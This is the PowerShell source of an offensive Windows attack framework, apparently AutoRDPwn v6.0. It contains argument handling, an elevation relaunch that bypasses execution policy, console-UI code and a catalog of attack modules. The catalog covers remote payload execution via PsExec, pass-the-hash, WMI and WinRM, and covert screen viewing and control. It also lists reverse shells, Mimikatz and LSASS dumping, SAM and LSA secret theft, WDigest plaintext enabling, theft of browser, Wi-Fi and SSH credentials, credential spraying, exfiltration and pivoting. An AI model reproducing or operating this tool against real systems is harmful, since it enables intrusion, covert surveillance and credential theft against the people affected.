param(
    [switch]$noadmin,
    [switch]$nogui,
    [string]$lang = '',
    [string]$option = '',
    [string]$shadow = '',
    [switch]$createuser,
    [switch]$noclean,
    [string]$Target,
    [string]$User,
    [string]$Password,
    [ValidateSet('control','view')][string]$Mode,
    [switch]$Yes,
    [string]$Config,
    [switch]$List,
    [switch]$ListJson
)

$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
Set-StrictMode -Off
try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }

$script:ARVersion = '6.0'
$script:ARIsWindows = ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)
$script:ARNoAdmin = [bool]$noadmin
$script:ARNoGui = [bool]$nogui
$script:ARNoClean = [bool]$noclean
$script:ARCreateUser = [bool]$createuser
$script:ARLanguageArgument = [string]$lang
$script:ARShadowPreference = ([string]$shadow).Trim().ToLowerInvariant()
$script:ARInvokedFromOption = -not [string]::IsNullOrWhiteSpace($option)
$script:AROptionValue = ([string]$option).Trim()

if (-not (Get-Variable -Name ARAssumeYes -Scope Script -ErrorAction SilentlyContinue)) { $script:ARAssumeYes = $false }
if (-not (Get-Variable -Name ARCliTarget -Scope Script -ErrorAction SilentlyContinue)) { $script:ARCliTarget = '' }
if (-not (Get-Variable -Name ARCliUser -Scope Script -ErrorAction SilentlyContinue)) { $script:ARCliUser = '' }
if (-not (Get-Variable -Name ARCliPassword -Scope Script -ErrorAction SilentlyContinue)) { $script:ARCliPassword = $null }
if (-not (Get-Variable -Name ARCliMode -Scope Script -ErrorAction SilentlyContinue)) { $script:ARCliMode = '' }
if (-not (Get-Variable -Name ARConfigPath -Scope Script -ErrorAction SilentlyContinue)) { $script:ARConfigPath = '' }

if ($PSBoundParameters.ContainsKey('Target')) { $script:ARCliTarget = [string]$Target }
if ($PSBoundParameters.ContainsKey('User')) { $script:ARCliUser = [string]$User }
if ($PSBoundParameters.ContainsKey('Password')) { $script:ARCliPassword = [string]$Password }
if ($PSBoundParameters.ContainsKey('Mode')) { $script:ARCliMode = [string]$Mode }
if ($PSBoundParameters.ContainsKey('Config')) { $script:ARConfigPath = [string]$Config }
if ($PSBoundParameters.ContainsKey('Yes')) { $script:ARAssumeYes = $true }

# Bound-but-empty -option and stray positional/unknown tokens used to fall through to
# interactive mode or into $args; both are argument errors and must fail loudly.
if ($PSBoundParameters.ContainsKey('option') -and [string]::IsNullOrWhiteSpace($option)) {
    Write-Host '[!] -option requires a value, for example: -option 8' -ForegroundColor Red
    exit 1
}
if ($args.Count -gt 0) {
    Write-Host ('[!] Unknown argument: ' + ($args -join ' ')) -ForegroundColor Red
    exit 1
}
$script:AROriginalLocation = (Get-Location).Path

$script:ARLocal = $false
$script:ARRoot = ''
$candidates = New-Object System.Collections.Generic.List[string]
if ($PSScriptRoot) { $candidates.Add($PSScriptRoot) }
if ($MyInvocation.MyCommand.Path) { $candidates.Add((Split-Path -Parent $MyInvocation.MyCommand.Path)) }
$candidates.Add((Get-Location).Path)
foreach ($candidate in $candidates) {
    if ([string]::IsNullOrWhiteSpace($candidate)) { continue }
    if (Test-Path -LiteralPath (Join-Path $candidate 'Resources\Scripts')) {
        $script:ARRoot = $candidate
        $script:ARLocal = $true
        break
    }
}
if (-not $script:ARLocal) {
    $script:ARRoot = Join-Path $env:TEMP 'AutoRDPwn'
}
$script:ARResources = Join-Path $script:ARRoot 'Resources'
$script:ARTools = Join-Path $script:ARResources 'Tools'
foreach ($directory in @($script:ARRoot, $script:ARResources, $script:ARTools)) {
    if (-not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
}
$script:ARRepository = 'https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master'

try {
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
} catch { }
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch { }

function Test-ARHeaderAdmin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

function Format-ARHeaderArgument {
    param([string]$Value)
    # Windows command-line rules: backslashes are literal except immediately before a
    # quote, so a run in front of '"' doubles and the quote is escaped; a trailing run
    # doubles so the closing quote is not swallowed by it.
    $escaped = [regex]::Replace($Value, '(\\*)"', '$1$1\"')
    $escaped = [regex]::Replace($escaped, '(\\+)$', '$1$1')
    return ('"' + $escaped + '"')
}

if ($script:ARIsWindows -and -not $script:ARNoAdmin -and -not (Test-ARHeaderAdmin)) {
    $launcher = ''
    if ($PSCommandPath) { $launcher = $PSCommandPath }
    elseif ($MyInvocation.MyCommand.Path) { $launcher = $MyInvocation.MyCommand.Path }
    if ([string]::IsNullOrWhiteSpace($launcher)) {
        Write-Host '[!] Administrator privileges are required.' -ForegroundColor Red
        exit 1
    }
    # Generic forwarding: the child argument list is rebuilt from the parameters that
    # were actually bound, so any switch added to the param block later survives
    # elevation without this block changing. -noadmin is the elevation opt-out and is
    # never forwarded; the child runs on the elevated token, Test-ARHeaderAdmin then
    # returns true and the relaunch cannot recurse.
    $forward = New-Object System.Collections.Generic.List[string]
    foreach ($parameterName in $PSBoundParameters.Keys) {
        if ($parameterName -eq 'noadmin') { continue }
        $parameterValue = $PSBoundParameters[$parameterName]
        if ($parameterValue -is [System.Management.Automation.SwitchParameter]) {
            if ($parameterValue.IsPresent) { $forward.Add('-' + $parameterName) }
            continue
        }
        $parameterText = [string]$parameterValue
        if ([string]::IsNullOrEmpty($parameterText)) { continue }
        $forward.Add('-' + $parameterName)
        $forward.Add((Format-ARHeaderArgument $parameterText))
    }
    $argumentList = @('-sta', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $launcher + '"'))
    foreach ($argument in $forward) { $argumentList += $argument }
    Write-Host '[i] Requesting administrator privileges...' -ForegroundColor Green
    try {
        $startArgs = @{
            FilePath = 'powershell.exe'
            Verb = 'RunAs'
            ArgumentList = $argumentList
            ErrorAction = 'Stop'
        }
        if ($script:ARLocal) { $startArgs['WorkingDirectory'] = $script:ARRoot }
        Start-Process @startArgs | Out-Null
    } catch {
        Write-Host '[!] Elevation cancelled. Run this terminal as Administrator, or launch with -noadmin.' -ForegroundColor Red
        Start-Sleep -Seconds 3
        exit 1
    }
    exit
}

try {
    $Host.UI.RawUI.WindowTitle = 'AutoRDPwn - v6.0 - by jeko'
    $Host.UI.RawUI.BackgroundColor = 'Black'
    $Host.UI.RawUI.ForegroundColor = 'Gray'
} catch { }

$script:ARLocaleName = 'English'
$script:ARStrings = @{}
$script:ARFallbackStrings = @{}
$script:ARTarget = @{
    Computer   = 'localhost'
    User       = ''
    Password   = ''
    Hash       = ''
    Domain     = ''
    AttackerIP = ''
    Mode       = 'control'
}
$script:ARStatus = @{ Text = 'Ready'; Kind = 'Info' }
$script:ARScroll = 0
$script:ARSelectedId = ''
$script:ARFilter = ''
$script:ARSessionState = 'not connected'
$script:ARTestMode = $false
$script:ARNoClear = $false
$script:ARTestWidth = 0
$script:ARTestHeight = 0
$script:ARTestBuffer = New-Object System.Collections.Generic.List[string]
$script:ARActionCatalogCache = $null
$script:ARTargetProfilesPath = ''
$script:ARTuiFrameActive = $false
$script:ARTuiFrameScreen = ''
$script:ARTuiFrameWidth = 0
$script:ARTuiFrameHeight = 0
$script:ARTuiFrameLine = 0
$script:ARAdminState = $null
$script:ARTuiLevel = ''
$script:ARSelectedCategoryKey = 'quick'
$script:ARCategoryScroll = 0
$script:ARPendingKey = $null
$script:ARTuiPromptRow = 0
$script:ARLineCategoryKey = ''
$script:ARTuiCapture = $null
$script:ARTuiFrameRows = @()
$script:ARTuiFrameSignature = ''
$script:ARFavorites = New-Object System.Collections.Generic.List[string]
$script:ARFavoritesLoaded = $false
$script:ARFilterStore = @{ categories = ''; actions = '' }
$script:ARLegacyMap = @{
    '11' = '101'
    '12' = '201'
    '13' = '301'
    '14' = '401'
    '15' = '501'
    '16' = '601'
    '17' = '701'
}

function Import-ARLanguage {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [switch]$AsFallback
    )
    if (-not (Test-Path -LiteralPath $Path)) {
        throw "Language file not found: $Path"
    }
    $captured = & {
        . $Path
        Get-Variable -Name 'txt*', 'Pwn*' -ErrorAction SilentlyContinue
    }
    $strings = @{}
    foreach ($item in $captured) {
        if ($null -ne $item -and $item.Name) {
            $strings[$item.Name] = [string]$item.Value
        }
    }
    if ($AsFallback) {
        $script:ARFallbackStrings = $strings
    }
    else {
        $script:ARStrings = $strings
    }
}

function Get-ARText {
    param(
        [Parameter(Mandatory = $true)][string]$Key,
        [string]$Default = ''
    )
    if ($script:ARStrings.ContainsKey($Key)) {
        return $script:ARStrings[$Key]
    }
    if ($script:ARFallbackStrings.ContainsKey($Key)) {
        return $script:ARFallbackStrings[$Key]
    }
    return $Default
}

function Set-ARLanguageName {
    param([Parameter(Mandatory = $true)][string]$Name)
    $script:ARLocaleName = $Name
}

function Set-ARStatus {
    param(
        [Parameter(Mandatory = $true)][string]$Text,
        [ValidateSet('Info', 'Ok', 'Warn', 'Error')][string]$Kind = 'Info'
    )
    $script:ARStatus = @{ Text = $Text; Kind = $Kind }
}

function Set-ARSessionState {
    param([string]$State)
    if ($null -eq $State -or $State -eq '') {
        $script:ARSessionState = 'not connected'
    }
    else {
        $script:ARSessionState = $State
    }
}

function Format-ARText {
    param(
        [AllowNull()][string]$Text,
        [int]$MaxWidth
    )
    if ($MaxWidth -lt 1) { return '' }
    if ($null -eq $Text) { return '' }
    $flat = ($Text -replace '[\r\n\t]+', ' ').Trim()
    if ($flat.Length -le $MaxWidth) { return $flat }
    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
    return $flat.Substring(0, $MaxWidth - 3) + '...'
}

function Get-ARWrappedLines {
    param(
        [AllowNull()][string]$Text,
        [int]$Width,
        [int]$MaxLines
    )
    $result = New-Object System.Collections.Generic.List[string]
    if ($Width -lt 4 -or $MaxLines -lt 1) { return @() }
    if ($null -eq $Text) { return @() }
    $flat = ($Text -replace '\s+', ' ').Trim()
    if ($flat -eq '') { return @() }
    $words = $flat -split ' '
    $line = ''
    $truncated = $false
    foreach ($word in $words) {
        if ($word.Length -gt $Width) {
            if ($line -ne '') {
                $result.Add($line)
                $line = ''
                if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            }
            $result.Add($word.Substring(0, $Width))
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            continue
        }
        if ($line -eq '') {
            $candidate = $word
        }
        else {
            $candidate = $line + ' ' + $word
        }
        if ($candidate.Length -le $Width) {
            $line = $candidate
        }
        else {
            $result.Add($line)
            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
            $line = $word
        }
    }
    if ($result.Count -lt $MaxLines -and $line -ne '') {
        $result.Add($line)
    }
    elseif ($line -ne '') {
        $truncated = $true
    }
    if ($truncated -and $result.Count -gt 0) {
        $last = $result[$result.Count - 1]
        if ($last.Length -gt ($Width - 3)) {
            $last = $last.Substring(0, $Width - 3)
        }
        $result[$result.Count - 1] = $last + '...'
    }
    return $result.ToArray()
}

function Get-ARConsoleWidth {
    if ($script:ARTestMode -and $script:ARTestWidth -gt 0) { return $script:ARTestWidth }
    $width = 100
    try {
        if ([Console]::WindowWidth -gt 0) { $width = [Console]::WindowWidth }
    }
    catch { }
    if ($width -lt 60) { $width = 60 }
    return $width
}

function Get-ARConsoleHeight {
    if ($script:ARTestMode -and $script:ARTestHeight -gt 0) { return $script:ARTestHeight }
    $height = 30
    try {
        if ([Console]::WindowHeight -gt 0) { $height = [Console]::WindowHeight }
    }
    catch { }
    if ($height -lt 20) { $height = 20 }
    return $height
}

function Clear-ARScreen {
    if ($script:ARTestMode) { return }
    if ($script:ARNoClear) { return }
    Clear-Host
}

function Start-ARTuiFrame {
    param([string]$Screen = 'main')
    $script:ARTuiCapture = $null
    $script:ARTuiFrameRows = @()
    $script:ARTuiFrameSignature = ''
    if ($script:ARTestMode) { return }
    try {
        $width = Get-ARConsoleWidth
        $height = Get-ARConsoleHeight
        $needsClear = (-not $script:ARTuiFrameActive) -or
            ($Screen -ne $script:ARTuiFrameScreen) -or
            ($width -ne $script:ARTuiFrameWidth) -or
            ($height -ne $script:ARTuiFrameHeight)
        if ($needsClear) {
            if (-not $script:ARNoClear) { Clear-Host }
            $script:ARTuiFrameActive = $true
            $script:ARTuiFrameScreen = $Screen
            $script:ARTuiFrameWidth = $width
            $script:ARTuiFrameHeight = $height
        }
        try { [Console]::CursorVisible = $false } catch { }
        try {
            [Console]::SetCursorPosition(0, 0)
            $script:ARTuiFrameLine = 0
        }
        catch {
            Clear-ARScreen
            $script:ARTuiFrameActive = $false
        }
    }
    catch {
        Clear-ARScreen
        $script:ARTuiFrameActive = $false
    }
}

function Stop-ARTuiFrame {
    if ($script:ARTestMode) { return }
    try {
        $row = [Math]::Min((Get-ARConsoleHeight) - 1, [Math]::Max(0, $script:ARTuiFrameLine))
        [Console]::SetCursorPosition(0, $row)
    }
    catch { }
    try { [Console]::CursorVisible = $true } catch { }
    $script:ARTuiFrameActive = $false
    $script:ARTuiFrameScreen = ''
}

function Write-ARLine {
    param(
        [AllowEmptyString()][string]$Text = '',
        [string]$Color = 'Gray',
        [string]$Background = ''
    )
    if ($script:ARTestMode) {
        $script:ARTestBuffer.Add($Text)
        return
    }
    if ($null -ne $script:ARTuiCapture) {
        $script:ARTuiCapture.Add([pscustomobject]@{
                Text       = [string]$Text
                Color      = [string]$Color
                Background = [string]$Background
            })
        return
    }
    if ($script:ARTuiFrameActive) {
        $width = $script:ARTuiFrameWidth - 1
        if ($width -gt 0 -and $Text.Length -lt $width) {
            $Text = $Text.PadRight($width)
        }
        $script:ARTuiFrameLine++
    }
    if ($Background -ne '') {
        Write-Host $Text -ForegroundColor $Color -BackgroundColor $Background
    }
    else {
        Write-Host $Text -ForegroundColor $Color
    }
}

function Begin-ARTuiCapture {
    if ($script:ARTestMode) {
        $script:ARTuiCapture = $null
        return
    }
    $script:ARTuiCapture = New-Object System.Collections.Generic.List[object]
}

function Write-ARTuiRowAt {
    param(
        [int]$Row = 0,
        [AllowEmptyString()][string]$Text = '',
        [string]$Color = 'Gray',
        [string]$Background = '',
        [int]$Width = 0
    )
    $line = [string]$Text
    if ($Width -gt 0) {
        if ($line.Length -lt $Width) { $line = $line.PadRight($Width) }
        elseif ($line.Length -gt $Width) { $line = $line.Substring(0, $Width) }
    }
    try { [Console]::SetCursorPosition(0, $Row) } catch { }
    # -NoNewline keeps the cursor off the last row, so a full frame never scrolls
    # the buffer and the row index stays valid for the next diff.
    if ($Background -ne '') {
        Write-Host $line -ForegroundColor $Color -BackgroundColor $Background -NoNewline
    }
    else {
        Write-Host $line -ForegroundColor $Color -NoNewline
    }
}

function Out-ARTuiFrame {
    param([string]$Screen = 'main')

    $rows = @()
    if ($null -ne $script:ARTuiCapture) { $rows = @($script:ARTuiCapture.ToArray()) }
    $script:ARTuiCapture = $null
    if ($script:ARTestMode) { return }

    $width = Get-ARConsoleWidth
    $height = Get-ARConsoleHeight
    $rowWidth = [Math]::Max(0, $width - 1)
    $signature = ('{0}|{1}|{2}' -f $Screen, $width, $height)
    $previous = @($script:ARTuiFrameRows)
    $sameShape = ($signature -eq $script:ARTuiFrameSignature) -and ($previous.Count -gt 0)

    $script:ARTuiFrameSignature = $signature
    $script:ARTuiFrameRows = $rows
    $script:ARTuiFrameWidth = $width
    $script:ARTuiFrameHeight = $height
    $script:ARTuiFrameScreen = $Screen
    $script:ARTuiFrameActive = $true
    $script:ARTuiFrameLine = $rows.Count

    $painted = $false
    if ($sameShape) {
        try {
            for ($i = 0; $i -lt $rows.Count; $i++) {
                $row = $rows[$i]
                if ($i -lt $previous.Count) {
                    $old = $previous[$i]
                    if ($old.Text -eq $row.Text -and $old.Color -eq $row.Color -and $old.Background -eq $row.Background) { continue }
                }
                Write-ARTuiRowAt -Row $i -Text $row.Text -Color $row.Color -Background $row.Background -Width $rowWidth
            }
            for ($i = $rows.Count; $i -lt $previous.Count; $i++) {
                Write-ARTuiRowAt -Row $i -Text '' -Width $rowWidth
            }
            $painted = $true
        }
        catch {
            $painted = $false
        }
    }

    if (-not $painted) {
        if (-not $script:ARNoClear) {
            try { Clear-Host } catch { }
        }
        for ($i = 0; $i -lt $rows.Count; $i++) {
            $row = $rows[$i]
            Write-ARTuiRowAt -Row $i -Text $row.Text -Color $row.Color -Background $row.Background -Width $rowWidth
        }
    }
    try { [Console]::CursorVisible = $false } catch { }
}

function Test-ARSessionOpen {
    $variable = Get-Variable -Name 'ARSession' -Scope Script -ErrorAction SilentlyContinue
    if ($null -eq $variable) { return $false }
    if ($null -eq $variable.Value) { return $false }
    try {
        $state = [string]$variable.Value.State
        if ($state -ne '' -and $state -ne 'Opened') { return $false }
    }
    catch { }
    return $true
}

function Get-ARFavorites {
    if (-not $script:ARFavoritesLoaded) {
        $script:ARFavorites = New-Object System.Collections.Generic.List[string]
        $state = Get-ARLastState
        if ($state.ContainsKey('Favorites')) {
            foreach ($entry in @($state['Favorites'])) {
                if ($null -eq $entry) { continue }
                $id = ([string]$entry).Trim()
                if ($id -eq '') { continue }
                if (-not $script:ARFavorites.Contains($id)) { $script:ARFavorites.Add($id) }
            }
        }
        $script:ARFavoritesLoaded = $true
    }
    return @($script:ARFavorites.ToArray())
}

function Save-ARFavorites {
    # Merge into the shared state file so the language, the last profile and the
    # saved timestamp survive a favourite toggle.
    $state = Get-ARLastState
    $state['Favorites'] = [string[]]@($script:ARFavorites.ToArray())
    if (-not $state.ContainsKey('Saved')) {
        $state['Saved'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    }
    Save-ARLastState -State $state
}

function Test-ARFavorite {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $false }
    foreach ($favorite in @(Get-ARFavorites)) {
        if ($favorite -eq $Id) { return $true }
    }
    return $false
}

function Toggle-ARFavorite {
    param([string]$Id = '')
    if ([string]::IsNullOrWhiteSpace($Id)) { return $false }
    $null = Get-ARFavorites
    if ($script:ARFavorites.Contains($Id)) {
        $null = $script:ARFavorites.Remove($Id)
        Save-ARFavorites
        Set-ARStatus ((Get-ARText 'txt177' 'Removed from favourites') + ': ' + $Id) 'Info'
        return $false
    }
    $script:ARFavorites.Add($Id)
    Save-ARFavorites
    Set-ARStatus ((Get-ARText 'txt176' 'Added to favourites') + ': ' + $Id) 'Info'
    return $true
}

function Test-ARIsAdmin {
    if ($null -ne $script:ARAdminState) { return $script:ARAdminState }
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $script:ARAdminState = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        $script:ARAdminState = $false
    }
    return $script:ARAdminState
}

function New-ARAction {
    param(
        [Parameter(Mandatory = $true)][string]$Id,
        [Parameter(Mandatory = $true)][string]$Title,
        [Parameter(Mandatory = $true)][string]$Description,
        [Parameter(Mandatory = $true)][string]$Handler,
        [bool]$NeedsTarget = $true,
        [bool]$NeedsSession = $true
    )
    return [pscustomobject]@{
        Kind         = 'Action'
        Id           = $Id
        Title        = $Title
        Description  = $Description
        Handler      = $Handler
        NeedsTarget  = $NeedsTarget
        NeedsSession = $NeedsSession
    }
}

function New-ARGroup {
    param(
        [Parameter(Mandatory = $true)][string]$Title,
        [string]$Description = ''
    )
    return [pscustomobject]@{
        Kind        = 'Group'
        Title       = $Title
        Description = $Description
    }
}

function Reset-ARActionCatalogCache {
    $script:ARActionCatalogCache = $null
}

function Get-ARActionCatalog {
    if ($null -ne $script:ARActionCatalogCache) { return $script:ARActionCatalogCache }
    $items = New-Object System.Collections.Generic.List[object]

    $items.Add((New-ARAction -Id '1' -Title (Get-ARText 'txt155' 'PSexec (SMB)') -Description 'Copy and start the payload with PSexec over SMB, then open the shadow session.' -Handler 'Invoke-ARAttackPSexec' -NeedsSession $false))
    $items.Add((New-ARAction -Id '2' -Title (Get-ARText 'txt156' 'Pass the Hash (SMB)') -Description 'Authenticate with an NTLM hash through SMBExec and start the payload.' -Handler 'Invoke-ARAttackPassTheHash' -NeedsSession $false))
    $items.Add((New-ARAction -Id '3' -Title (Get-ARText 'txt157' 'Windows Management Instrumentation (WMI)') -Description 'Create the remote process through CIM/WMI with optional credentials.' -Handler 'Invoke-ARAttackWmi' -NeedsSession $false))
    $items.Add((New-ARAction -Id '4' -Title (Get-ARText 'txt158' 'Windows Remote Management (WinRM)') -Description 'Run the payload through a WinRM session with optional credentials.' -Handler 'Invoke-ARAttackWinRm' -NeedsSession $false))
    $items.Add((New-ARAction -Id '5' -Title (Get-ARText 'txt159' 'Windows Remote Assistance (WinRS)') -Description 'Run the payload with WinRS and then open the shadow session.' -Handler 'Invoke-ARAttackWinRs' -NeedsSession $false))
    $items.Add((New-ARAction -Id '6' -Title (Get-ARText 'txt160' 'Local Session Hijacking (TSCon)') -Description 'Attach the current console to another local session with tscon.' -Handler 'Invoke-ARAttackTscon' -NeedsTarget $false -NeedsSession $false))
    $items.Add((New-ARAction -Id '7' -Title (Get-ARText 'txt161' 'Remote Desktop Execution (RDP)') -Description 'Start the payload through SharpRDP and then open the shadow session.' -Handler 'Invoke-ARAttackRdp' -NeedsSession $false))
    $items.Add((New-ARAction -Id '8' -Title (Get-ARText 'txt121' 'Quick Screen (Stealth VNC)') -Description (Get-ARText 'txt122' 'Watch or control the target screen without the user noticing') -Handler 'Invoke-ARAttackQuickScreen'))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt17' 'Remote Access') -Description (Get-ARText 'txt139' 'Shells, consoles and reverse connections that stay open')))
    $items.Add((New-ARAction -Id '101' -Title (Get-ARText 'txt217' 'Named Pipe Remote Shell (SMB)') -Description (Get-ARText 'txt95' 'Remote shell through a named pipe over SMB port 445') -Handler 'Invoke-ARModulePipeShell'))
    $items.Add((New-ARAction -Id '102' -Title (Get-ARText 'txt39' 'Semi-interactive console (WinRS)') -Description (Get-ARText 'txt96' 'Remote console over WinRM port 5985 using direct PowerShell') -Handler 'Invoke-ARModuleWinRsConsole'))
    $items.Add((New-ARAction -Id '103' -Title (Get-ARText 'txt218' 'PowerShell HTTP-RevShell (HTTP/S)') -Description (Get-ARText 'txt97' 'Reverse shell that dials back over HTTP/S, crosses proxies') -Handler 'Invoke-ARModuleHttpRevShell'))
    $items.Add((New-ARAction -Id '104' -Title (Get-ARText 'txt51' 'Netcat console (direct connection)') -Description (Get-ARText 'txt99' 'The target listens and you connect to it') -Handler 'Invoke-ARModuleNetcatDirect'))
    $items.Add((New-ARAction -Id '105' -Title (Get-ARText 'txt52' 'Netcat console (reverse connection)') -Description (Get-ARText 'txt98' 'You listen and the target connects back to you') -Handler 'Invoke-ARModuleNetcatReverse'))
    $items.Add((New-ARAction -Id '801' -Title (Get-ARText 'txt166' 'Enable RDP') -Description 'Enable Remote Desktop and its firewall rule, restoring every value on cleanup' -Handler 'Invoke-ARAttackEnableRdp' -NeedsSession $true))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt50' 'Passwords and hashes') -Description (Get-ARText 'txt140' 'Dump credentials, browser secrets and saved Wi-Fi keys')))
    $items.Add((New-ARAction -Id '201' -Title (Get-ARText 'txt9' 'Extract local hashes with Mimikatz') -Description (Get-ARText 'txt100' 'Dump local account password hashes from the SAM registry hive') -Handler 'Invoke-ARModuleMimikatzSam'))
    $items.Add((New-ARAction -Id '202' -Title (Get-ARText 'txt10' 'Extract system passwords with Mimikatz') -Description (Get-ARText 'txt101' 'Extract plaintext passwords from the memory of authenticated processes') -Handler 'Invoke-ARModuleMimikatzLogon'))
    $items.Add((New-ARAction -Id '203' -Title (Get-ARText 'txt49' 'Obtain browsers passwords with SharpWeb') -Description (Get-ARText 'txt102' 'Recover passwords saved in Chrome, Firefox and other browsers') -Handler 'Invoke-ARModuleSharpWeb'))
    $items.Add((New-ARAction -Id '204' -Title (Get-ARText 'txt59' 'Recover Wi-Fi passwords') -Description (Get-ARText 'txt103' 'Show the keys of saved WiFi networks in clear text') -Handler 'Invoke-ARModuleWifiKeys'))
    $items.Add((New-ARAction -Id '205' -Title (Get-ARText 'txt163' 'Lsass dump') -Description 'Dump LSASS memory with comsvcs.dll and pull the minidump back to the operator' -Handler 'Invoke-ARAttackLsassDump' -NeedsSession $true))
    $items.Add((New-ARAction -Id '206' -Title (Get-ARText 'txt164' 'Sam dump') -Description 'Save the SAM, SYSTEM and SECURITY hives with reg save and pull them back' -Handler 'Invoke-ARAttackSamDump' -NeedsSession $true))
    $items.Add((New-ARAction -Id '220' -Title (Get-ARText 'txt184' 'WDigest plaintext logon') -Description 'Set UseLogonCredential under WDigest so the next logon leaves the password in memory' -Handler 'Invoke-ARAttackWdigest' -NeedsSession $false))
    $items.Add((New-ARAction -Id '221' -Title (Get-ARText 'txt185' 'Credential Manager vault') -Description 'List and export the Credential Manager entries of the current user with vaultcmd' -Handler 'Invoke-ARAttackVaultDump' -NeedsSession $false))
    $items.Add((New-ARAction -Id '222' -Title (Get-ARText 'txt186' 'Browser saved passwords') -Description 'Copy Chrome and Edge Login Data and Local State and pull them for offline decryption' -Handler 'Invoke-ARAttackBrowserCredentials' -NeedsSession $false))
    $items.Add((New-ARAction -Id '223' -Title (Get-ARText 'txt187' 'Wi-Fi keys in clear') -Description 'Dump every saved wireless profile with key=clear and store the output as loot' -Handler 'Invoke-ARAttackWifiKeys' -NeedsSession $false))
    $items.Add((New-ARAction -Id '224' -Title (Get-ARText 'txt188' 'DPAPI master keys') -Description 'Copy the user and machine DPAPI master keys, zip them and pull the archive' -Handler 'Invoke-ARAttackDpapiMasterKeys' -NeedsSession $false))
    $items.Add((New-ARAction -Id '225' -Title (Get-ARText 'txt189' 'LSA secrets (SECURITY hive)') -Description 'Save the SECURITY and SYSTEM hives for an offline secretsdump and pull them' -Handler 'Invoke-ARAttackLsaSecrets' -NeedsSession $false))
    $items.Add((New-ARAction -Id '226' -Title (Get-ARText 'txt190' 'SSH private keys') -Description 'Collect id_*, *.pem, known_hosts and config from every profile into one archive' -Handler 'Invoke-ARAttackSshKeys' -NeedsSession $false))
    $items.Add((New-ARAction -Id '227' -Title (Get-ARText 'txt191' 'Kerberos ticket cache') -Description 'Dump the Kerberos ticket cache of the logged-on user with klist and save it to loot' -Handler 'Invoke-ARAttackKerberosTickets' -NeedsSession $true))
    $items.Add((New-ARAction -Id '228' -Title (Get-ARText 'txt192' 'Token privileges') -Description 'Show whoami /priv and /groups and flag SeImpersonate, SeDebug, SeBackup, SeRestore and SeTakeOwnership' -Handler 'Invoke-ARAttackTokenPrivileges' -NeedsSession $false))
    $items.Add((New-ARAction -Id '229' -Title (Get-ARText 'txt193' 'Cached domain logons') -Description 'Read the cached logon count from Winlogon and report whether cached credentials exist' -Handler 'Invoke-ARAttackCachedLogons' -NeedsSession $false))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt125' 'Networking / Pivoting') -Description (Get-ARText 'txt141' 'Scan, forward ports, serve files and spray credentials')))
    $items.Add((New-ARAction -Id '301' -Title (Get-ARText 'txt219' 'TCP Port Scan') -Description (Get-ARText 'txt104' 'Multi-threaded TCP port scan of the target') -Handler 'Invoke-ARModulePortScan' -NeedsSession $false))
    $items.Add((New-ARAction -Id '302' -Title (Get-ARText 'txt220' 'Native Port Forwarding') -Description (Get-ARText 'txt105' 'Forward ports with netsh, inbound locally or remote pivoting') -Handler 'Invoke-ARModulePortForward'))
    $items.Add((New-ARAction -Id '303' -Title (Get-ARText 'txt221' 'PowerShell Web Server') -Description (Get-ARText 'txt106' 'Serve files from the target with a PowerShell web server') -Handler 'Invoke-ARModuleWebServer'))
    $items.Add((New-ARAction -Id '304' -Title (Get-ARText 'txt222' 'Network Creds Scanner') -Description (Get-ARText 'txt107' 'Test a password or NTLM hash against a CIDR range via SMB/WMI') -Handler 'Invoke-ARModuleCredScan' -NeedsSession $false))
    $items.Add((New-ARAction -Id '207' -Title (Get-ARText 'txt165' 'Credential spray') -Description 'Try one password against a list of users over SMB and report the hits' -Handler 'Invoke-ARAttackCredentialSpray' -NeedsSession $false))
    $items.Add((New-ARAction -Id '901' -Title (Get-ARText 'txt171' 'File exfiltration') -Description 'Zip a folder on the target and pull the archive back to the operator' -Handler 'Invoke-ARModuleFileExfil' -NeedsSession $true))

    $items.Add((New-ARGroup -Title (Get-ARText 'txt236' 'Lateral movement') -Description (Get-ARText 'txt237' 'Hops and pivots that reach a second host through the current one')))
    $items.Add((New-ARAction -Id '620' -Title (Get-ARText 'txt238' 'Pivot proxy') -Description (Get-ARText 'txt239' 'netsh interface portproxy on the target for a chosen port pair, registered for cleanup') -Handler 'Invoke-ARModulePivotProxy' -NeedsSession $true))
    $items.Add((New-ARAction -Id '621' -Title (Get-ARText 'txt240' 'SOCKS over WinRM') -Description (Get-ARText 'txt241' 'SOCKS5 listener on the operator tunnelled through the WinRM session, prints the connection string') -Handler 'Invoke-ARModuleSocksOverWinRm' -NeedsSession $true))
    $items.Add((New-ARAction -Id '622' -Title (Get-ARText 'txt242' 'Remote share mount') -Description (Get-ARText 'txt243' 'Mount a remote share with given credentials, unmount in finally') -Handler 'Invoke-ARModuleShareMount' -NeedsSession $true))
